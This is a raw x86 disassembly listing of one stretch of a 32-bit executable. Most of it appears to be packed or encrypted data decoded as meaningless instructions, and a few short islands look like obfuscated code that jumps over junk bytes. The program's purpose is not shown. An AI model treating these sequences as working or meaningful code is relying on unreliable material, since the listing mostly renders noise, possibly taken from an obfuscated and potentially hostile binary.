  40559e:	cmc    
  40559f:	mov    dh,0x69
  4055a1:	fwait
  4055a2:	jns    0x4055ee
  4055a4:	sub    cl,ah
  4055a6:	mov    edx,0x97a2c9d5
  4055ab:	jp     0x405614
  4055ad:	jl     0x405539
  4055af:	xchg   DWORD PTR [esi+0x2a],edx
  4055b2:	ds loopne 0x40559e
  4055b5:	pcmpeqb mm6,QWORD PTR [edi]
  4055b8:	xor    DWORD PTR [edi+0x6a0497],edx
  4055be:	add    bh,bl
  4055c0:	mov    BYTE PTR ds:0x8d4199b7,bl
  4055c6:	xchg   ch,bl
  4055c8:	pop    ebp
  4055c9:	push   0xcc59a921
  4055ce:	xchg   DWORD PTR [ebx+0x59],esp
  4055d1:	fs cmc 
  4055d3:	cld    
  4055d4:	push   ecx
  4055d5:	dec    esi
  4055d6:	ror    BYTE PTR [ebx],0xcb
  4055d9:	stos   DWORD PTR es:[edi],eax
  4055da:	ja     0x4055f1
  4055dc:	test   DWORD PTR [ecx+0x65],ebp
  4055df:	cmp    bh,dh
  4055e1:	rcr    DWORD PTR [edi],0x99
  4055e4:	mov    dl,0x2a
  4055e6:	pop    ds
  4055e7:	fstp   TBYTE PTR [edx+0x76d28e6e]
  4055ed:	stc    
  4055ee:	stos   BYTE PTR es:[edi],al
  4055ef:	or     bl,BYTE PTR [ebp-0x6bde1c9d]
  4055f5:	adc    bh,BYTE PTR [ebx]
  4055f7:	cmp    eax,0x2655a405
  4055fc:	pop    ecx
  4055fd:	xor    bl,bh
  4055ff:	fadd   st,st(3)
  405601:	jp     0x4055df
  405603:	ins    DWORD PTR es:[edi],dx
  405604:	add    dl,0x2f
  405607:	dec    edx
  405608:	sub    al,ch
  40560a:	sbb    eax,0xb025423
  40560f:	push   ss
  405610:	push   ebp
  405611:	daa    
  405612:	sbb    BYTE PTR [edi-0x24],al
  405615:	adc    DWORD PTR es:[esi],esp
  405618:	(bad)  
  405619:	test   al,0x62
  40561b:	sbb    al,0x66
  40561d:	adc    DWORD PTR [ecx+0x16f6b9ac],ebp
  405623:	idiv   DWORD PTR [edi+0x2f]
  405626:	out    0xfa,eax
  405628:	and    eax,0x96ce6a0d
  40562d:	ja     0x40565d
  40562f:	test   al,0xa3
  405631:	push   ecx
  405632:	pushf  
  405633:	mov    BYTE PTR [ebx],dl
  405635:	dec    ebp
  405636:	push   esp
  405637:	mov    eax,ds:0x60df4267
  40563c:	mov    DWORD PTR [ebx-0x34ee83cf],ebx
  405642:	lods   eax,DWORD PTR ds:[esi]
  405643:	xor    BYTE PTR [ebx+0x678504c3],ah
  405649:	pop    bp
  40564b:	sahf   
  40564c:	(bad)  
  40564d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40564e:	loope  0x4056b6
  405650:	add    eax,0xdfe71f55
  405655:	rol    esp,0xb6
  405658:	xor    bh,0xbb
  40565b:	(bad)  
  40565c:	popf   
  40565d:	adc    eax,0x27f22df1
  405662:	test   eax,0x9b9b77ed
  405667:	or     edi,DWORD PTR [edi]
  405669:	xor    eax,0xa1df3be8
  40566e:	das    
  40566f:	xor    bh,BYTE PTR [ebx]
  405671:	test   ah,bl
  405673:	dec    eax
  405674:	call   0x8425:0x3749cd19
  40567b:	pop    esp
  40567c:	add    DWORD PTR [eax+ebx*4],ebp
  40567f:	mov    al,ds:0x9a2e2aae
  405684:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405685:	pop    edx
  405686:	xchg   edx,eax
  405687:	out    dx,al
  405688:	xor    al,0x36
  40568a:	mov    esp,0xea51b805
  40568f:	sbb    ebx,DWORD PTR [ecx-0x1cc8d17b]
  405695:	rcl    DWORD PTR [bx+si-0x24],0xac
  40569a:	nop
  40569b:	add    esi,DWORD PTR [esi+esi*4-0x4f]
  40569f:	in     al,dx
  4056a0:	or     esi,DWORD PTR [eax-0x28]
  4056a3:	mov    WORD PTR [edi+0x6ee09ed4],fs
  4056a9:	push   esi
  4056aa:	mov    al,ds:0x355ac50a
  4056af:	cs pop eax
  4056b1:	xchg   esp,eax
  4056b2:	mov    al,ds:0x4257948
  4056b7:	ins    DWORD PTR es:[edi],dx
  4056b8:	imul   esp,edx,0x52
  4056bb:	retf   
  4056bc:	das    
  4056bd:	dec    eax
  4056be:	xchg   esi,eax
  4056bf:	fldcw  WORD PTR [eax-0x51]
  4056c2:	sti    
  4056c3:	jns    0x4056f2
  4056c5:	dec    esp
  4056c6:	sahf   
  4056c7:	inc    ebx
  4056c8:	and    al,0x5e
  4056ca:	mov    ah,0xec
  4056cc:	jg     0x40569d
  4056ce:	or     ebx,ebx
  4056d0:	push   ebx
  4056d1:	cli    
  4056d2:	rcl    ch,1
  4056d4:	dec    DWORD PTR [esi]
  4056d6:	bound  eax,QWORD PTR [ebx+0x48]
  4056d9:	and    BYTE PTR [esi],bh
  4056db:	inc    ecx
  4056dc:	fwait
  4056dd:	sub    eax,0x4d6cd6ee
  4056e2:	mov    ch,0x54
  4056e4:	test   DWORD PTR [edi+0x23b6bf40],edi
  4056ea:	test   al,0x96
  4056ec:	and    al,0xf0
  4056ee:	ret    0xc451
  4056f1:	enter  0x6175,0x19
  4056f5:	adc    ch,0x4c
  4056f8:	lods   eax,DWORD PTR ds:[esi]
  4056f9:	(bad)  
  4056fa:	or     al,0x1e
  4056fc:	pop    ss
  4056fd:	dec    esp
  4056fe:	cmp    bh,al
  405700:	mov    ds:0xa56cad4f,eax
  405705:	sbb    cl,BYTE PTR [eax-0x58ce7925]
  40570b:	popa   
  40570c:	call   0x199e:0x65897429
  405713:	mov    ah,BYTE PTR [esi-0x2c]
  405716:	mov    bl,0x40
  405718:	push   ds
  405719:	dec    esp
  40571a:	lods   eax,DWORD PTR ds:[esi]
  40571b:	mov    ch,0x55
  40571d:	mov    ebx,0x4b3d2c66
  405722:	div    DWORD PTR [esi+0x467b2923]
  405728:	pop    ss
  405729:	fldenv [edx-0x14]
  40572c:	and    ah,bh
  40572e:	xor    BYTE PTR [eax-0x4a],cl
  405731:	xor    ebx,ebp
  405733:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405734:	call   0x997297df
  405739:	mov    bh,0x1c
  40573b:	adc    esi,DWORD PTR [esi+0x160ed30e]
  405741:	lock mov esp,0x354e4f27
  405747:	hlt    
  405748:	push   ebx
  405749:	rcl    DWORD PTR [edi+0x5a],1
  40574c:	pop    esp
  40574d:	fisttp QWORD PTR [ebp+0x4897cf05]
  405753:	jmp    0xb396bf
  405758:	ins    BYTE PTR es:[edi],dx
  405759:	pusha  
  40575a:	aas    
  40575b:	icebp  
  40575c:	cmp    al,0xb4
  40575e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40575f:	pop    ds
  405760:	push   bx
  405762:	or     DWORD PTR [ebx+0x5938d0fe],edx
  405768:	push   eax
  405769:	mov    bl,0xe1
  40576b:	sti    
  40576c:	inc    esi
  40576d:	out    0x59,al
  40576f:	mov    eax,ds:0xd8fad697
  405774:	(bad)  
  405775:	(bad)  
  405776:	xchg   edx,eax
  405777:	xchg   esi,eax
  405778:	retf   
  405779:	imul   esi,eax,0xffffffac
  40577c:	fmul   st,st(4)
  40577e:	ds jmp 0x4057f2
  405781:	loopne 0x405771
  405783:	shr    DWORD PTR [edi-0x3],1
  405786:	clc    
  405787:	shl    esp,1
  405789:	popa   
  40578a:	or     eax,0xc0eb3f21
  40578f:	ja     0x405780
  405791:	cs jl  0x4057e0
  405794:	or     DWORD PTR [edi+0x8],ebp
  405797:	les    edx,FWORD PTR [esi-0x5b33ebc7]
  40579d:	inc    ecx
  40579e:	and    cl,al
  4057a0:	sti    
  4057a1:	pop    ds
  4057a2:	sub    cl,0xa6
  4057a5:	in     al,dx
  4057a6:	or     DWORD PTR [ebp+0x52a95e77],esp
  4057ac:	inc    esi
  4057ad:	mov    cl,bh
  4057af:	cmp    DWORD PTR [eax],ebp
  4057b1:	mov    esp,0xe7081860
  4057b6:	(bad)  
  4057b7:	jle    0x405747
  4057b9:	push   es
  4057ba:	mov    dl,0x47
  4057bc:	stc    
  4057bd:	sahf   
  4057be:	xchg   esi,eax
  4057bf:	rcr    DWORD PTR [edi],0x92
  4057c2:	pusha  
  4057c3:	sub    eax,0x52f922f3
  4057c8:	retf   0xf88b
  4057cb:	in     al,0x28
  4057cd:	dec    esp
  4057ce:	icebp  
  4057cf:	push   esp
  4057d0:	loope  0x4057a3
  4057d2:	(bad)  
  4057d3:	stos   DWORD PTR es:[edi],eax
  4057d4:	lods   al,BYTE PTR ds:[esi]
  4057d5:	add    eax,0xf3ab8065
  4057da:	sub    edi,DWORD PTR [eax]
  4057dc:	loope  0x4057fe
  4057de:	or     eax,0x731708ff
  4057e3:	mov    DWORD PTR [ebx+ebp*2],esp
  4057e6:	mov    ebx,0xa7a133c2
  4057eb:	frstor ds:0xc01ba3d7
  4057f1:	rcr    DWORD PTR [ebx+0xf509b84],cl
  4057f7:	push   eax
  4057f8:	lods   eax,DWORD PTR ds:[esi]
  4057f9:	mov    al,ds:0x181ffad0
  4057fe:	add    ebx,ebp
  405800:	sbb    al,0x9b
  405802:	dec    esp
  405803:	jmp    0x168441e
  405808:	xchg   BYTE PTR [ebp-0x61],bl
  40580b:	retf   0x76cd
  40580e:	dec    ebp
  40580f:	hlt    
  405810:	sbb    eax,0x85cfb63d
  405815:	lods   eax,DWORD PTR ds:[esi]
  405816:	push   edx
  405817:	int3   
  405818:	outs   dx,BYTE PTR ds:[esi]
  405819:	into   
  40581a:	sbb    BYTE PTR [edx+0x15],0x64
  40581e:	jmp    0x9954:0xe699ca98
  405825:	sub    BYTE PTR [esi-0x67e6ce26],cl
  40582b:	fisub  DWORD PTR [eax-0x3b6e2531]
  405831:	or     eax,0xdf8117c0
  405836:	dec    ebx
  405837:	xchg   edi,eax
  405838:	jle    0x405840
  40583a:	mov    edx,DWORD PTR [esi+0x4]
  40583d:	neg    DWORD PTR ds:0x42834b
  405843:	mov    DWORD PTR [ebp-0x2c],ecx
  405846:	cmp    DWORD PTR ds:0x428137,0x0
  40584d:	mov    DWORD PTR ds:0x428227,0x540
  405857:	mov    ecx,0x427
  40585c:	mov    edx,0x7aa7
  405861:	jmp    0x4058af
  405866:	mov    ecx,0x6abc
  40586b:	mov    DWORD PTR ds:0x428227,0x2ac5
  405875:	cmp    DWORD PTR ds:0x428137,0x0
  40587c:	jb     0x40589d
  405882:	push   0x1050
  405887:	call   DWORD PTR ds:0x428e34
  40588d:	adc    DWORD PTR ds:0x4282cb,edx
  405893:	or     DWORD PTR ds:0x4281fb,0x369f
  40589d:	neg    DWORD PTR ds:0x42813b
  4058a3:	sub    DWORD PTR ds:0x42811b,edi
  4058a9:	sub    edx,0xfd0
  4058af:	mov    ecx,DWORD PTR [ebp+0x18]
  4058b2:	mov    edx,DWORD PTR [ebp+0x1c]
  4058b5:	shrd   ecx,edx,0x2
  4058b9:	shr    edx,0x2
  4058bc:	mov    DWORD PTR [ebp-0x1c],ecx
  4058bf:	mov    ecx,DWORD PTR [ebp+0x18]
  4058c2:	mov    edx,DWORD PTR [ebp+0x1c]
  4058c5:	xor    DWORD PTR [ebp-0x1c],edi
  4058c8:	xor    edx,edx
  4058ca:	or     edx,DWORD PTR [ebp-0x1c]
  4058cd:	shl    ecx,0x1e
  4058d0:	add    edx,DWORD PTR [ebp-0x2c]
  4058d3:	add    DWORD PTR [eax],edx
  4058d5:	mov    eax,DWORD PTR [esi]
  4058d7:	mov    ecx,DWORD PTR [esi+0x4]
  4058da:	shrd   eax,ecx,0x2
  4058de:	shr    ecx,0x2
  4058e1:	mov    ecx,DWORD PTR [esi]
  4058e3:	mov    edx,DWORD PTR [esi+0x4]
  4058e6:	xor    eax,edi
  4058e8:	shl    ecx,0x1e
  4058eb:	xor    edx,edx
  4058ed:	or     edx,eax
  4058ef:	mov    DWORD PTR [ebp-0x4],edx
  4058f2:	mov    DWORD PTR [ebp-0x30],0xca79a575
  4058f9:	mov    eax,0x9c1b89e8
  4058fe:	jmp    0x405cdc
  405903:	ret    
  405904:	scas   eax,DWORD PTR es:[edi]
  405905:	sar    ebx,0x9d
  405908:	fcmovb st,st(2)
  40590a:	scas   al,BYTE PTR es:[edi]
  40590b:	mov    dl,0xbd
  40590d:	(bad)  
  40590e:	jl     0x40597a
  405910:	dec    eax
  405911:	mov    DWORD PTR [ebp+ebp*2-0x4f],edi
  405915:	sbb    BYTE PTR [eax],bl
  405917:	sahf   
  405918:	adc    bl,BYTE PTR [eax]
  40591a:	sbb    BYTE PTR [esi],dh
  40591c:	lahf   
  40591d:	iret   
  40591e:	ficomp WORD PTR [eax+0x775d364a]
  405924:	out    0x82,al
  405926:	sub    DWORD PTR [edi-0x5ebf31f5],0x68cb1b15
  405930:	retf   0x96cc
  405933:	cwde   
  405934:	xor    dl,BYTE PTR [edx-0x68]
  405937:	vpmacssdd ymm11,ymm3,YMMWORD PTR [ebx+0x71],ymm7
  40593e:	stos   DWORD PTR es:[edi],eax
  40593f:	mov    ah,0x66
  405941:	sub    esi,DWORD PTR [ebp+ecx*4+0x6ff3c99f]
  405948:	cmp    ah,BYTE PTR cs:[eax-0x18]
  40594c:	bound  esi,QWORD PTR [eax-0x55ca3908]
  405952:	rcl    BYTE PTR [edi+0xc2dfa67],cl
  405958:	add    DWORD PTR [edi+0x39],edx
  40595b:	cli    
  40595c:	pop    esi
  40595d:	mov    WORD PTR [edx],cs
  40595f:	scas   eax,DWORD PTR es:[edi]
  405960:	les    eax,FWORD PTR [ecx]
  405962:	add    esp,DWORD PTR [esi+ebp*4+0x2b7ed9bb]
  405969:	push   cs
  40596a:	je     0x4059b9
  40596c:	cmp    dl,dl
  40596e:	mov    dl,0xf
  405970:	fcom   st(4)
  405972:	pop    ecx
  405973:	aam    0x59
  405975:	dec    esi
  405976:	rcl    DWORD PTR [edi],cl
  405978:	test   eax,0x23513f0a
  40597d:	adc    dl,bh
  40597f:	loope  0x40591c
  405981:	sub    BYTE PTR [ebp+0x76],bl
  405984:	add    ebx,DWORD PTR [edx+edi*8+0x698bbd1e]
  40598b:	sub    eax,0xad44f878
  405990:	xchg   edi,eax
  405991:	imul   eax,DWORD PTR ds:0x680b7a0d,0x2c
  405998:	ficomp DWORD PTR [ebp+ebp*1+0x76]
  40599c:	add    al,al
  40599e:	pop    ebp
  40599f:	jmp    0x40593f
  4059a1:	imul   esi,DWORD PTR [ebp+0x50],0xffffffab
  4059a5:	les    esp,FWORD PTR [ebx-0x23]
  4059a8:	fdiv   DWORD PTR [ebx]
  4059aa:	and    BYTE PTR [ebp+0x767566a2],0xa4
  4059b1:	jns    0x4059ea
  4059b3:	dec    edx
  4059b4:	leave  
  4059b5:	mov    esi,0x5dddc3a8
  4059ba:	inc    BYTE PTR [ebx]
  4059bc:	mov    ch,0xbe
  4059be:	mov    ch,0x80
  4059c0:	mov    esi,0x63354d9f
  4059c5:	inc    ebx
  4059c6:	outs   dx,BYTE PTR ds:[esi]
  4059c7:	cmp    ebp,DWORD PTR [edi]
  4059c9:	push   ecx
  4059ca:	inc    esi
  4059cb:	iret   
  4059cc:	ins    BYTE PTR es:[edi],dx
  4059cd:	mov    cl,0x90
  4059cf:	adc    DWORD PTR [eiz*2-0x65849087],edi
  4059d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059d7:	dec    esp
  4059d8:	sbb    al,0x26
  4059da:	das    
  4059db:	iret   
  4059dc:	lods   al,BYTE PTR ds:[esi]
  4059dd:	stos   BYTE PTR es:[edi],al
  4059de:	data16 mov ds:0xac429ba9,al
  4059e4:	addr16 jo 0x4059d2
  4059e7:	sahf   
  4059e8:	(bad)  
  4059e9:	outs   dx,DWORD PTR ds:[esi]
  4059ea:	in     al,dx
  4059eb:	jmp    0x74f8438c
  4059f0:	out    0x4f,al
  4059f2:	xor    al,0x46
  4059f4:	in     eax,dx
  4059f5:	rcpps  xmm0,XMMWORD PTR [eax]
  4059f8:	je     0x405a09
  4059fa:	pop    ecx
  4059fb:	fild   WORD PTR [edx-0x5f96d257]
  405a01:	jle    0x4059f0
  405a03:	sub    eax,DWORD PTR [ebx+eiz*2-0x33]
  405a07:	jnp    0x405a4b
  405a09:	retf   
  405a0a:	inc    eax
  405a0b:	lods   eax,DWORD PTR ds:[esi]
  405a0c:	pop    ds
  405a0d:	push   eax
  405a0e:	inc    ecx
  405a0f:	cmp    al,0xad
  405a11:	outs   dx,BYTE PTR ds:[esi]
  405a12:	fs jl  0x405a90
  405a15:	adc    ecx,0x5cd67ef9
  405a1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a1c:	adc    dl,al
  405a1e:	retf   0x166c
  405a21:	jl     0x405a63
  405a23:	xlat   BYTE PTR ds:[ebx]
  405a24:	inc    ecx
  405a25:	mov    edx,0x14ab9f43
  405a2a:	fs fwait
  405a2c:	ins    DWORD PTR es:[edi],dx
  405a2d:	out    0x90,al
  405a2f:	jbe    0x4059e6
  405a31:	scas   al,BYTE PTR es:[edi]
  405a32:	inc    eax
  405a33:	xor    edi,esi
  405a35:	push   edi
  405a36:	add    cl,BYTE PTR [ebp-0x4ca55464]
  405a3c:	test   al,0xab
  405a3e:	pop    ss
  405a3f:	test   eax,0x5615fbc8
  405a44:	cmc    
  405a45:	loope  0x405a34
  405a47:	push   esp
  405a48:	and    al,0xe1
  405a4a:	jnp    0x405a1a
  405a4c:	or     BYTE PTR [ebx+0x0],0xdf
  405a50:	push   0xffffffc1
  405a52:	cwde   
  405a53:	pop    ebx
  405a54:	sub    esi,ecx
  405a56:	push   ds
  405a57:	adc    DWORD PTR [edx],ebx
  405a59:	clc    
  405a5a:	dec    eax
  405a5b:	(bad)  
  405a5c:	call   DWORD PTR [edx+0x13]
  405a5f:	sub    esp,DWORD PTR [edi-0x54]
  405a62:	paddusw mm1,QWORD PTR [edi-0x50]
  405a66:	inc    ebx
  405a67:	ret    
  405a68:	hlt    
  405a69:	sub    ebx,DWORD PTR [ecx+0x67]
  405a6c:	ds in  al,0x46
  405a6f:	jo     0x405a27
  405a71:	sbb    edi,eax
  405a73:	pop    eax
  405a74:	ins    DWORD PTR es:[edi],dx
  405a75:	sbb    dl,dl
  405a77:	push   DWORD PTR [ecx]
  405a79:	pop    edx
  405a7a:	aad    0x7f
  405a7c:	cmp    eax,0xd6818f86
  405a81:	call   0xb9456e78
  405a86:	pop    ebp
  405a87:	pop    edx
  405a88:	xchg   esi,eax
  405a89:	mov    bh,0xd4
  405a8b:	mov    edi,0x20b3020e
  405a90:	adc    ch,BYTE PTR [esi+edi*2]
  405a93:	pop    esp
  405a94:	jmp    0x405ab0
  405a96:	dec    ebx
  405a97:	mov    ebx,0x4c0d5fc3
  405a9c:	mov    edi,0x1f88ec6d
  405aa1:	xchg   edi,eax
  405aa2:	aas    
  405aa3:	add    BYTE PTR [eax+0x5982c6f0],ch
  405aa9:	ins    DWORD PTR es:[edi],dx
  405aaa:	xor    eax,0xe4817cf2
  405aaf:	call   0xc58a6b4d
  405ab4:	(bad)  
  405ab5:	cmovg  edi,edx
  405ab8:	ins    DWORD PTR es:[edi],dx
  405ab9:	shl    dl,cl
  405abb:	or     BYTE PTR [ebx+0x3c],al
  405abe:	into   
  405abf:	lods   eax,DWORD PTR ds:[esi]
  405ac0:	dec    edi
  405ac1:	enter  0x4635,0x13
  405ac5:	add    BYTE PTR [esp+ebx*2-0x6f35b758],bh
  405acc:	xor    eax,0x37a7f8e4
  405ad1:	in     eax,dx
  405ad2:	jecxz  0x405b2d
  405ad4:	int3   
  405ad5:	aas    
  405ad6:	add    al,0x69
  405ad8:	les    eax,FWORD PTR [eax+0x3c]
  405adb:	test   al,0xf9
  405add:	lds    esp,FWORD PTR [ebx+0x67]
  405ae0:	mov    bl,0x51
  405ae2:	jmp    0x405ac1
  405ae4:	(bad)  
  405ae5:	in     eax,dx
  405ae6:	bound  eax,QWORD PTR [esi]
  405ae8:	or     BYTE PTR [edx+0x83acc58],bh
  405aee:	add    BYTE PTR [ebp+0x43],al
  405af1:	dec    edi
  405af2:	pop    edx
  405af3:	bound  esp,QWORD PTR [ecx]
  405af5:	push   ds
  405af6:	test   eax,0xc7a8dfa8
  405afb:	rol    DWORD PTR [edi+0xb5ec182],cl
  405b01:	mov    bl,BYTE PTR [ebp-0x5e42a122]
  405b07:	stos   BYTE PTR es:[edi],al
  405b08:	ficom  DWORD PTR [ebp+0x2b]
  405b0b:	jp     0x405b87
  405b0d:	pop    ss
  405b0e:	std    
  405b0f:	push   ds
  405b10:	bound  ecx,QWORD PTR [ebx]
  405b12:	rol    BYTE PTR [eax-0x55],cl
  405b15:	lds    edx,FWORD PTR [esi+0x66eceba2]
  405b1b:	pop    ecx
  405b1c:	push   ds
  405b1d:	in     eax,dx
  405b1e:	lods   al,BYTE PTR ds:[esi]
  405b1f:	cwde   
  405b20:	(bad)  
  405b21:	pop    esp
  405b22:	fbstp  TBYTE PTR [esi+edx*4-0x2c]
  405b26:	out    0x5,al
  405b28:	jmp    0x60ae:0x40b9adbf
  405b2f:	mov    edx,0xf4edf0d0
  405b34:	adc    al,0x31
  405b36:	pushf  
  405b37:	sbb    BYTE PTR [ebp-0x2d4be4f2],cl
  405b3d:	call   0x85da:0x8a7edcbc
  405b44:	mov    WORD PTR [ebp+0x6e],gs
  405b47:	cli    
  405b48:	xchg   BYTE PTR gs:[edi],dh
  405b4b:	je     0x405b7d
  405b4d:	int3   
  405b4e:	inc    ecx
  405b4f:	std    
  405b50:	add    BYTE PTR ds:[edx-0x1],0x85
  405b55:	fs dec ebp
  405b57:	mov    ebp,0x1016de52
  405b5c:	mov    ebp,0x42167504
  405b61:	push   esi
  405b62:	pushf  
  405b63:	outs   dx,BYTE PTR ds:[esi]
  405b64:	lahf   
  405b65:	(bad)
  405b68:	in     eax,dx
  405b69:	adc    BYTE PTR [ebx],ch
  405b6b:	cmp    eax,DWORD PTR [edx+eiz*4]
  405b6e:	ror    DWORD PTR [ecx+ebp*2],cl
  405b71:	retf   0xa55c
  405b74:	xchg   BYTE PTR [esi+0x5d270517],ah
  405b7a:	push   esp
  405b7b:	jae    0x405bf6
  405b7d:	popa   
  405b7e:	xor    DWORD PTR [edi+0x20],edi
  405b81:	call   0x7b0e:0xc7ec2f52
  405b88:	rol    DWORD PTR ds:0xb1648207,0x8b
  405b8f:	jmp    0x405b2a
  405b91:	sub    eax,0xae5a381f
  405b96:	mov    ds:0x8bbbe532,al
  405b9b:	jp     0x405b8c
  405b9d:	add    al,0xd0
  405b9f:	fs mov edx,0x4e509a7a
  405ba5:	and    eax,0x5de717b0
  405baa:	dec    ebx
  405bab:	pop    ecx
  405bac:	loopne 0x405b85
  405bae:	and    cl,BYTE PTR gs:[edi+0x3fbff95e]
  405bb5:	fnstcw WORD PTR [eax-0x1a]
  405bb8:	ins    DWORD PTR es:[edi],dx
  405bb9:	clc    
  405bba:	mov    cl,0x70
  405bbc:	sbb    al,0xd9
  405bbe:	or     eax,0xcacbe2a5
  405bc3:	sbb    DWORD PTR [ebp+0x235e4c51],ebp
  405bc9:	fst    st(7)
  405bcb:	div    edx
  405bcd:	in     al,dx
  405bce:	mov    ecx,0x792a6d9c
  405bd3:	cld    
  405bd4:	imul   BYTE PTR [ebp+0x3d55499b]
  405bda:	(bad)  
  405bdb:	sbb    al,0x2b
  405bdd:	mov    bl,0xbd
  405bdf:	mov    DWORD PTR [ebp-0x29244080],esp
  405be5:	mov    eax,DWORD PTR ds:0xff1d4ad5
  405beb:	dec    edi
  405bec:	lock push edx
  405bee:	rcr    edi,0x37
  405bf1:	dec    esp
  405bf2:	cmp    al,0x92
  405bf4:	nop
  405bf5:	add    eax,0xb076a2a4
  405bfa:	sub    ch,bh
  405bfc:	loop   0x405c0e
  405bfe:	mov    ebp,0x53663449
  405c03:	mov    ch,0x7a
  405c05:	jae    0x405c2e
  405c07:	add    BYTE PTR [ecx],dh
  405c09:	popa   
  405c0a:	jg     0x405c56
  405c0c:	push   ebx
  405c0d:	push   es
  405c0e:	push   ds
  405c0f:	enter  0xfdbc,0x72
  405c13:	xchg   esp,eax
  405c14:	fist   DWORD PTR [ecx]
  405c16:	retf   
  405c17:	call   0x19a1:0xbdd8b447
  405c1e:	push   esi
  405c1f:	sahf   
  405c20:	out    dx,al
  405c21:	stos   BYTE PTR es:[edi],al
  405c22:	dec    ebp
  405c23:	mov    ecx,DWORD PTR ds:0x390204d7
  405c29:	outs   dx,BYTE PTR ds:[esi]
  405c2a:	and    BYTE PTR [ecx+0x68],bl
  405c2d:	and    edi,DWORD PTR [ebx-0x341eacad]
  405c33:	ins    BYTE PTR es:[edi],dx
  405c34:	(bad)  
  405c36:	cdq    
  405c37:	les    esp,FWORD PTR [esi]
  405c39:	and    BYTE PTR [edx],0xe0
  405c3c:	xchg   BYTE PTR ds:0xea62d475,dl
  405c42:	pop    esi
  405c43:	in     al,dx
  405c44:	xor    al,0xe3
  405c46:	and    bh,bl
  405c48:	xchg   ecx,eax
  405c49:	js     0x405cc6
  405c4b:	mov    DWORD PTR [edi+esi*8-0x46577085],edi
  405c52:	mov    edi,0xc9a38511
  405c57:	shr    eax,1
  405c59:	ja     0x405c34
  405c5b:	pop    es
  405c5c:	jmp    0x405c24
  405c5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c5f:	or     bl,bh
  405c61:	pop    edi
  405c62:	repz cli 
  405c64:	add    eax,0xf51c2787
  405c69:	jns    0x405c04
  405c6b:	pop    ebx
  405c6c:	sbb    bl,BYTE PTR [esi-0x257451ea]
  405c72:	loop   0x405c39
  405c74:	ss jg  0x405c42
  405c77:	shl    eax,0x3e
  405c7a:	sub    DWORD PTR [edi-0xe],0x48
  405c7e:	pushw  cs
  405c80:	cmp    dl,BYTE PTR [edx]
  405c82:	mov    WORD PTR [esi-0x1c],fs
  405c85:	mov    ?,WORD PTR [ebx+0x53]
  405c88:	ss retf 0xfc2b
  405c8c:	add    cl,0xc4
  405c8f:	and    al,0x11
  405c91:	ficom  DWORD PTR [ebx-0x39]
  405c94:	cmp    edx,ebx
  405c96:	sbb    esi,ebx
  405c98:	mov    eax,ds:0xe33ad229
  405c9d:	ror    DWORD PTR [eax-0x225406b0],cl
  405ca3:	or     esp,eax
  405ca5:	test   DWORD PTR [ebp+0x57b6851],0xd9c4578d
  405caf:	dec    esp
  405cb0:	pop    eax
  405cb1:	mov    dh,0x36
  405cb3:	inc    edi
  405cb4:	(bad)  
  405cb5:	pop    edi
  405cb6:	loope  0x405d0a
  405cb8:	mov    al,0xf4
  405cba:	mov    ss,ebx
  405cbc:	and    al,bh
  405cbe:	push   ss
  405cbf:	test   DWORD PTR [ecx],0xffc0d13e
  405cc5:	jle    0x405d1c
  405cc7:	mov    edx,0xdf4e1581
  405ccc:	sti    
  405ccd:	rol    BYTE PTR [edx-0x6e],0xe1
  405cd1:	mov    dh,0x55
  405cd3:	sbb    eax,0x9a3e9a6f
  405cd8:	enter  0x4b34,0x32
  405cdc:	mov    DWORD PTR [ebp-0x2c],eax
  405cdf:	mov    DWORD PTR [ebp-0x20],0xca79a571
  405ce6:	mov    DWORD PTR [ebp-0x1c],eax
  405ce9:	mov    DWORD PTR [ebp-0x10],0xca79a57d
  405cf0:	mov    DWORD PTR [ebp-0xc],eax
  405cf3:	mov    DWORD PTR [ebp-0x60],0xca79a579
  405cfa:	mov    DWORD PTR [ebp-0x5c],eax
  405cfd:	mov    eax,DWORD PTR [ebp-0x30]
  405d00:	mov    ecx,DWORD PTR [ebp-0x2c]
  405d03:	shrd   eax,ecx,0x2
  405d07:	shr    ecx,0x2
  405d0a:	mov    ecx,DWORD PTR [ebp-0x30]
  405d0d:	mov    edx,DWORD PTR [ebp-0x2c]
  405d10:	xor    eax,edi
  405d12:	shl    ecx,0x1e
  405d15:	xor    edx,edx
  405d17:	or     eax,edx
  405d19:	jmp    0x4060f7
  405d1e:	cmp    ebp,DWORD PTR [ecx+0x3e]
  405d21:	lock sbb ch,BYTE PTR [esi+0x62d8231a]
  405d28:	shl    DWORD PTR [eax-0x5c],1
  405d2b:	push   eax
  405d2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d2d:	mov    esp,0x1818a9f2
  405d32:	sahf   
  405d33:	adc    bl,BYTE PTR [eax]
  405d35:	sbb    BYTE PTR [ecx+0x5be15600],dl
  405d3b:	xlat   BYTE PTR ds:[ebx]
  405d3c:	xchg   edi,eax
  405d3d:	mov    ah,0xf7
  405d3f:	fcom   DWORD PTR [edi-0x6ab959ab]
  405d45:	mov    WORD PTR [edi+0x411c1a13],?
  405d4b:	dec    esi
  405d4c:	cmp    dh,BYTE PTR [edx+0x15f9ad50]
  405d52:	pop    eax
  405d53:	mov    WORD PTR [ecx-0xd66f6fe],es
  405d59:	push   ecx
  405d5a:	pop    edx
  405d5b:	xchg   ebx,eax
  405d5c:	add    dl,BYTE PTR [ecx+0x63]
  405d5f:	push   0x34402780
  405d64:	push   esp
  405d65:	aaa    
  405d66:	int    0xdb
  405d68:	pop    edi
  405d69:	mov    al,ds:0x3445ec7c
  405d6e:	arpl   WORD PTR [ecx],ax
  405d70:	xor    esi,DWORD PTR [edi]
  405d72:	dec    ebp
  405d73:	das    
  405d74:	push   eax
  405d75:	add    BYTE PTR [ebx-0x69e50753],dl
  405d7b:	mov    ds,WORD PTR [edi-0x49]
  405d7e:	addr16 pop esp
  405d80:	dec    cl
  405d82:	mov    WORD PTR [ebx],gs
  405d84:	(bad)
  405d88:	jbe    0x405d27
  405d8a:	ret    
  405d8b:	daa    
  405d8c:	or     eax,0x21f15b0d
  405d91:	push   es
  405d92:	push   DWORD PTR [eax+0x2f]
  405d95:	fimul  WORD PTR [edi+0x761eb8ce]
